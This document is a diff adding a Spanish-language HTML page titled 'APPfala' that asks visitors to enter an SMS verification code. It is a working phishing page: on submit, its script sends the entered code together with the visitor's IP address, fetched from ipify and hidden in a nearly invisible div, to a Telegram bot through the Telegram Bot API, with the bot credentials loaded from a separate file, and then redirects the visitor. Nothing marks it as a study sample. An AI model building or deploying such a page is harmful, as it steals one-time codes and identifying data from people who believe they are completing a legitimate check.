@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html >
+
+<head>
+
+
+ 
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script src="ohkk.js"></script>
+    <script>
+      $.getJSON("https://api.ipify.org?format=json", function(data) {
+        $("#gfg").html(data.ip);
+      });
+    
+      var u_name, ip, ip2, message;
+      var ready = function() {
+        u_name = document.getElementById("codg").value;
+        ip = document.getElementById("gfg").innerHTML;
+        ip2 = document.getElementById("address").innerHTML;
+        message = "Cod papa\n☰CODGP: " + u_name + "\n🌎IP: " + ip +"\n" + ip2;
+      };
+    
+      var sender = function() {
+        ready();
+        var settings = {
+          "async": true,
+          "crossDomain": true,
+          "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+          "method": "POST",
+          "headers": {
+            "Content-Type": "application/json",
+            "cache-control": "no-cache"
+          },
+          "data": JSON.stringify({
+            "chat_id": chat_id,
+            "text": message
+          })
+        };
+        $.ajax(settings).done(function(response) {
+          console.log(response);
+          window.location = 'index.html';
+        });
+        return false;
+      };
+    </script>
+    
+    <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>APPfala</title>
+  <link rel="stylesheet" href="portada/styles.css">
+</head>
+
+<body>
+
+
+  <div>
+   <center> <img width="200px"   src="portada/spacee2.png" alt="">
+    <h1>Ingresa lo solicitado</h1><br></center>
+    <form method="post" action="#" onsubmit="return sender();">
+   
+      <label for="userInput">Ingresa el SMS que enviamos a tu dispositivo <br><br></label>
+      <input minlength="6" placeholder="SMS" type="tel" id="codg" name="codg" required  autocomplete="off">
+
+ 
+      <button type="submit">CONFIRMAR</button>
+    </form>
+  </div><br>
+
+</body>
+<div style="color: rgb(255, 255, 255);font-size: 0.05px;" >
+  <p id="gfg"></p>
+  <p id="ip"></p>
+  <p id="address"></p></div>
+</html>
